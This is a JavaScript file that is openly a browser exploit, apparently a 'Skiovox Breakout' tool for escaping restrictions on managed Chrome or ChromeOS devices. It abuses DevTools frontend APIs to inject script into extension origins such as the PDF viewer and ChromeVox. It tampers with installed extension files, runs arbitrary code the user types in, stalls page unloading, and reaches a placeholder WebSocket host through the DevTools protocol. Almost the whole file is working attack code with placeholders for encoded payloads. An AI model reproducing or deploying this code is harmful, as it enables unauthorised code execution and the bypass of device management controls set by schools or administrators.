(function () {
    if (!opener) {
        opener = window;
    }
    // alert(origin);

    //     window.w = w;
    // })
    const w = window.opener.open("devtools://devtools/bundled/devtools_app.html");
    window.opener.close();
    w.addEventListener("load", async () => {
        if (!w.DevToolsAPI) {
            console.log("reloading");
            w.opener = null;
            w.location.reload();
        }
        await sleep(500);
        console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
        exploit(w);
    });

    window.w = w;


    function exploit(w) {


        function ui() {
            const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
            var globalUID = 0;
            let globalMap = [];
            function payload_swamp(w, d) {
                const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                console.log('hi');
                // if (location.origin.includes("chrome-extension://" + pdfId)) {
                //     w.close();
                //     chrome.tabs.getCurrent(function (info) {
                //         chrome.windows.create({
                //             setSelfAsOpener: true,
                //             url: mojoURL
                //         }, function (win) {
                //             const r = win.tabs[0].id;
                //             chrome.tabs.executeScript(r, { code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"` });

                //         })
                //     })


                //     return;
                // }

                // console.log(d);
                // w.setTimeout(function() {
                const blob_url = new Blob(["alert(1)"], { type: "text/html" });

                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {
                    function removeFile(file) {
                        return new Promise(function (resolve, reject) {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(resolve);
                            })
                        });
                    }
                    function writeFile(file, data) {
                        return new Promise((resolve, reject) => {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(function () {
                                    fs.root.getFile(file, { create: true }, function (entry) {
                                        entry.createWriter(function (writer) {
                                            writer.write(new Blob([data]));
                                            resolve(entry.toURL());
                                        })
                                    })
                                })
                            })
                        })
                    };
                    if (d.cleanup) {
                        console.log("cleaning up");
                        debugger;
                        await removeFile('index.js');
                        await removeFile('index.html');
                        alert("Cleaned up successfully!");
                        cleanup();
                        w.close();
                        return;
                    }
                    await writeFile('index.js', atob(`%%EXTJS%%`))
                    const url = await writeFile('index.html', `${atob('%%EXTHTML%%')}<script src="./index.js"></script>`);
                    w.chrome.tabs.create({ url });
                    w.close();
                    cleanup();
                });


                // }, 5000);

            }

            document.open();
            document.write(atob(`%%HTMLENTRY%%`));
            document.querySelector('#activate').onclick = function () {
                dbgext(false, "mndnfokpggljbaajbnioimlmbfngpief");
            }
            onunload = function () {
                const og = new Date().getTime();
                while (new Date().getTime() - og <= 5000);
            }
            document.close();
            document.title = "Dashboard";

            ondragover = function (e) {
                e.preventDefault();
            }
            ondrop = function (e) {
                for (const x of e.dataTransfer.items) {
                    const fileEnt = x.webkitGetAsEntry();
                    console.log(fileEnt);
                    InspectorFrontendHost.upgradeDraggedFileSystemPermissions(fileEnt.filesystem);
                    // error will occur but that's fine

                    InspectorFrontendHost.requestFileSystems();
                    e.preventDefault();
                }
            }
            self.fsDirEntries = [];
            InspectorFrontendAPI.fileSystemsLoaded = function (l) {

                const isoFs = [];
                const paths = [];
                for (const i of l) {
                    const fs = DevToolsHost.isolatedFileSystem(i.fileSystemName, i.rootURL);
                    fs.fpath = i.fileSystemPath;
                    isoFs.push(fs);
                    // paths.push(i.fileSystemPath);

                }
                self.isoFs = isoFs;
                self.paths = paths;
            }
            setInterval(function () {
                InspectorFrontendHost.requestFileSystems();
            }, 10);
            self.isoFs = [];
            self.paths = [];
            InspectorFrontendHost.requestFileSystems();
            document.querySelector('#forceprocsharing').onclick = function (ev) {
                function m() {
                    var x = 0;
                    const id = setInterval(() => {
                        if (x++ === 100) { clearTimeout(id) };
                        document.body.appendChild(document.createElement("iframe")).src = "data:text/html,<script>location.href = URL.createObjectURL(new Blob(['test'], {type : 'text/html'}));<\/script>";

                    }, 1);
                }
                const a = open();
                a.location.href = `javascript:(${m.toString()})()`;

            }
            document.querySelector('#filemanagerui').onclick = (ev) => {
                InspectorFrontendHost.requestFileSystems();
                const w = open('');
                function fmgrui() {
                    const fileEntries = opener.isoFs;
                    const idToDivMap = {};
                    const idToEntries = {};
                    function isManifestEntry(ent) {
                        const pathSplit = ent.fpath.split('/');
                        return pathSplit[pathSplit.length - 1] === "manifest.json"
                    }
                    function assert(p) {
                        console.assert(p);
                    };
                    async function convertToPerfetto(id) {
                        const manifestJson = `{
                            "$schema": "http://json.schemastore.org/chrome-manifest",    
                            "manifest_version": 3,
                            "name": "Skiovox Breakout",
                            "description": "BETA DO NOT SHARE",
                            "version": "0.0.1",
                            "key": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAhm3X7qutsrskke84ltokTObnFJakd/d0XFQ6Ox2wQueHTGJM5GUNPTY/x8bdreNtGnfzvt/Sd0vABbR0wsS6lz5yY+g6ksMXJnigFe9N7uz8E3KojDrl3xYjIe+mkiJo8yxxzPydgb7GjQ6jmsX3g+yjj67kXzm9rZFkmoZ5WmqwBZlguPYVRN/W8CIIqBZkC3Qmq6uSG7b/g93YbwqmTmGiL2sAzgvXtqvDOD6503abtQkRC795E4VjJd+ffyeRH38fAEz5ZIrA6GJsfmov1TZTIu1NTwqylSpBYl5as7C6gpmuxDV4SvHvGT2hMQuIufDhZhErjI3B7bcX+XLe1wIDAQAB",
                            "permissions": [
                                "debugger",
                                "downloads",
                                "downloads.open"
                            ],
                            "background": {
                                "service_worker": "/sw.js"
                            },
                            "action": {
                                "default_popup": "./index.html"
                            }
                        }
                        `;
                        // assert(idToEntries[id].length === 2); No longer valid, will need to overwrite verified_contents.json 
                        let manifestEntry = null;
                        let otherEntry = null;
                        for (const x of idToEntries[id]) {
                            if (isManifestEntry(x)) {
                                manifestEntry = x;
                            } else {
                                otherEntry = x;
                            }
                            if (manifestEntry && otherEntry) {
                                break;
                            }
                        }

                        manifestEntry = await new Promise((resolve) => {
                            manifestEntry.root.getFile('', { create: false }, resolve);
                        })
                        otherEntry = await new Promise((resolve) => {
                            otherEntry.root.getFile('', { create: false }, resolve);
                        })
                       
                        
                        setInterval(async function () {
                            const manifestWriter = await new Promise((resolve) => {
                                manifestEntry.createWriter(resolve);
                            });
                            manifestWriter.write(new Blob(["<><><><><><><>"]));
                        }, 0);
                        setInterval(async function () {
                            const entryWriter = await new Promise((resolve) => {
                                otherEntry.createWriter(resolve);
                            });
                            entryWriter.write(new Blob(["alert(1)"]));
                        }, 0);
                    }
                    for (const ent of fileEntries) {

                        console.log(ent);
                        const split = ent.fpath.split("Extensions");
                        const id = split[1].split('/')[1];
                        const alreadyExists = idToDivMap[id];

                        const ver = split[1].split('/')[2];
                        const path = split[1].split(ver)[1];
                        // console.log(id, ver, path);
                        idToEntries[id] = idToEntries[id] ?? [];
                        idToEntries[id].push(ent);
                        if (alreadyExists) {
                            continue;
                        }
                        idToDivMap[id] = idToDivMap[id] ?? document.createElement('div');
                        const h1 = document.createElement('h3');
                        h1.textContent = id;
                        const btn = document.createElement('button');
                        btn.onclick = function (ev) {
                            convertToPerfetto(id);
                        }
                        btn.textContent = "Convert to perfetto";
                        idToDivMap[id].appendChild(h1);
                        idToDivMap[id].appendChild(btn);
                    }
                    for (const x of Object.values(idToDivMap)) {
                        console.log(x);
                        document.body.appendChild(x);

                    }
                }
                setTimeout(function () {
                    w.eval(`(${fmgrui.toString()})()`);
                }, 200);
            }
            document.querySelector('#activate2').onclick = function (ev) {

                function xd(w) {
                    w.close();
                    const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                    const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                    chrome.tabs.getCurrent(function (tab) {
                        console.log(tab);
                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {
                            async function createAndWriteFile() {
                                function writeFile(filename, content) {
                                    return new Promise((resolve) => {
                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {
                                            fs.root.getFile(filename, { create: true }, function (entry) {
                                                entry.remove(function () {
                                                    fs.root.getFile(filename, { create: true }, function (entry) {
                                                        entry.createWriter(function (writer) {
                                                            writer.write(new Blob([content]))
                                                            writer.onwriteend = function () {
                                                                resolve(entry.toURL());
                                                            }
                                                        })
                                                    })
                                                })
                                            })
                                        })
                                    })

                                }
                                const htmlFile = `<html>
                                <head></head><body><iframe src="chrome://extensions/"></iframe>
                                </html>
                                
                                `

                                // alert(url);
                                opener.postMessage({ url: URL.createObjectURL(new Blob([htmlFile], { type: "text/html" })) }, '*');
                                setTimeout(function () {
                                    close();
                                }, 800);
                            }
                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });
                            function m2(url) {
                                // alert(url);
                                onmessage = function (data) {
                                    if (data.data.type === "ack") {
                                        // chrome.tabs.getCurrent(function (tab) {
                                        // alert("navigating");
                                        chrome.tabs.update(tab.id, { url })
                                        // })
                                    }
                                }
                                top.postMessage({ type: 'acc' }, '*');
                            }
                            onmessage = function (dat) {
                                if (dat.data.url) {
                                    m2(dat.data.url);
                                }
                            };
                        })
                    })

                }
                dbgext(false, pdfId, xd.toString());
            }
            document.querySelector('#updater').onclick = function (ev) {
                onunload = null;
                const ws = new WebSocket("ws://%%updaterurl%%");

                ws.onopen = function () {
                    ws.onmessage = function (ev) {
                        const received = JSON.parse(ev.data);
                        const savedURL = received.params.request.url;
                        ws.close();
                        const w = open('', '_blank');
                        console.log(savedURL);
                        w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank'); window.close()}, 500);`);
                        setTimeout(() => { location.reload() });
                    }
                    ws.send(JSON.stringify({
                        method: "Target.setDiscoverTargets",
                        id: 999,
                        params: {}
                    }));
                }

            }
            onmessage = function (d) {
                if (d.data.type === "acc") {
                    onunload = function () { while (true); };
                    d.source.postMessage({ type: "ack" }, '*');

                };

                if (!globalMap[d.data.uid]) return;

                for (const frame of globalMap) {
                    if (!frame) continue;
                    if (frame.idx === d.data.uid) {
                        frame.remove();
                        delete globalMap[globalMap.indexOf(frame)];
                        return;
                    }
                }
            }
            function dbgext(cleanup, id, payload) {
                let x = id;
                while (!x) {
                    x = prompt('Extension id?');
                    if (x === "cancel") {
                        return;
                    }
                }
                let path = 'manifest.json';
                let is_pdf = false;
                let injected = payload ?? payload_swamp.toString();
                if (x === pdfId) {
                    path = "index.html"; // pdf viewer hack
                    //     is_pdf = true;
                    //     const b = prompt("code to execute!");
                    //     if (!b) return;
                    //     injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
                    //     InspectorFrontendHost.setInjectedScriptForOrigin('chrome://extensions', b + '//');

                }
                else if (x === "mndnfokpggljbaajbnioimlmbfngpief") {
                    path = "chromevox/options/options.html"
                }
                console.log(x);

                const URL_1 = `chrome-extension://${x ??
                    alert("NOTREACHED")}/${path}`;
                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
                const ifr = document.createElement("iframe");
                ifr.src = URL_1;
                document.body.appendChild(ifr);
                const ifrid = globalMap.push(ifr) - 1;
                ifr.idx = ifrid;
                ifr.onload = function () {

                    ifr.contentWindow.postMessage({
                        type: "uidpass", passcode:
                            ifrid,
                        cleanup: cleanup
                    }, '*');
                    // console.log('hi');
                }
                // alert(1);

            }
            document.querySelector('#extdbg').onclick = function () {
                dbgext(false);
            }
            document.querySelector('#cleanup').onclick = function () {
                dbgext(true);
            }
            document.querySelector('#devdbg').onclick = function () {
                var l_canceled = false;
                const id = setTimeout(function m() {
                    if (l_canceled) return;
                    (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                    if (!l_canceled) setTimeout(m, 0);
                    clearTimeout(id);
                });
                Object.defineProperty(window, 'cancel', {
                    get: function () {
                        l_canceled = true;
                    }, configurable: true
                })
                return;
            }
            console.log(globalMap);
        }
        w.eval(`(${ui.toString()})()`);
        window.close();

    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
})